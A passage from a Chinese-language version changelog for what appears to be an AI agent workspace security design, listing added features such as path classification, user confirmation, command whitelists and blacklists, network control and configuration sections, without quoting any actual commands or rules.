>   - 新增章节 4.7：用户引导的工作空间访问
>   - 新增数据模型：PathClassification、TemporaryPermission、PendingConfirmation
>   - 新增接口：PathClassifier、TemporaryPermissionService、ConfirmationService
>   - 新增错误码：DENIED_PATH、PATH_REQUIRES_CONFIRMATION 等
>   - 更新文件结构：新增 confirmation/ 模块
> - v1.0.6 (2026-04-23): 安全增强版本
>   - 新增章节 4.8：执行命令安全（命令白名单、网络控制、子进程隔离）
>   - 新增章节 4.9：搜索工具安全（路径限制、结果过滤）
>   - 新增章节 4.10：目录列表安全（结果过滤、隐藏禁止目录）
>   - 新增章节 4.11：临时文件与自动创建目录
>   - 新增数据模型：CommandRule、ExecutionConfig、SearchConfig、ToolSecurityProfile
>   - 新增接口：ExecutionGuard、SearchGuard、ListDirGuard
>   - 新增错误码：COMMAND_DENIED、EXECUTION_TIMEOUT、NETWORK_ACCESS_DENIED 等
>   - 更新风险与约束：TOCTOU 防护措施、命令注入防护示例
> - v1.0.6 (2026-04-23): 配置完整版本
>   - 扩展附录 A：完整的配置项设计（10 个配置节）
>   - A.1 工作空间配置
>   - A.2 交换区配置
>   - A.3 路径分类配置（命令白名单 40+、黑名单 30+、危险模式 10+）
>   - A.4 执行安全配置
>   - A.5 搜索安全配置（忽略目录 20+、忽略模式 15+）
>   - A.6 目录列表安全配置
>   - A.7 审计配置
>   - A.8 临时权限配置
>   - A.9 用户确认配置
>   - A.10 Agent 级配置覆盖
>   - A.11 环境变量配置
